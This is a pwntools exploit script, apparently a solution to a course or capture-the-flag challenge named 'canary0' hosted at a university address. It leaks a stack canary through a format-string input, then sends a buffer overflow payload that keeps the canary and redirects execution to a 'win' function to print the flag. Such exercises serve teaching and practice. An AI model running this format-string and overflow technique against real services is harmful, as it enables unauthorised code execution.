from pwn import *

host = 'lettieri.iet.unipi.it'
port = 4410

context.update(arch='amd64')
elf = ELF('canary0') 
# 1st phase: extract the canary
io = remote(host, port)
io.sendline(b"%69$lx")
canary = int(io.recv(16).decode(), 16)
io.close()

# 2nd phase: inject the payload including the canary
payload  = b"A" * (0x200 - 8)
payload += p64(canary)
payload += b"B" * 8
payload += p64(elf.symbols.win)

io = remote(host, port)
io.sendline(payload)
io.recvuntil(b"flag:\n")
log.success(io.recvline().decode())
